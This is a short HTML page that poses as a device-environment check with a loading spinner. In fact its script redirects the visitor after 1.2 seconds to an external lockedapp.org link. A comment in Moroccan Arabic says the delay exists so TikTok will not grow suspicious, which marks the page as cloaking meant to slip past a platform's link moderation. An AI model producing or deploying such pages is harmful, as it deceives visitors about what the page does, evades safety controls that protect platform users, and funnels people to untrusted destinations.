<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Checking Environment...</title>

<style>
  body{
    margin:0;
    background:#0b0f19;
    color:#d5e1ff;
    font-family:Inter, sans-serif;
    height:100vh;
    display:flex;
    flex-direction:column;
    justify-content:center;
    align-items:center;
    text-align:center;
  }
  .loader{
    width:50px;height:50px;
    border:4px solid rgba(255,255,255,0.2);
    border-top:4px solid #28f0b6;
    border-radius:50%;
    animation:spin 0.9s linear infinite;
  }
  @keyframes spin{
    from{transform:rotate(0deg);}
    to{transform:rotate(360deg);}
  }
  h1{
    margin-top:18px;
    font-size:18px;
    font-weight:600;
    color:#cfe3ff;
  }
  p{
    font-size:14px;
    color:#8fa3c7;
    margin-top:6px;
  }
</style>

</head>
<body>

<div class="loader"></div>
<h1>Optimizing request...</h1>
<p>Please wait, checking your device environment.</p>

<script>
  // Delay 1.2s فقط باش تيكطوك ما يشكش
  setTimeout(function(){
    window.location.href = "https://lockedapp.org/cl/i/6ndmnj";
  }, 1200);
</script>

</body>
</html>
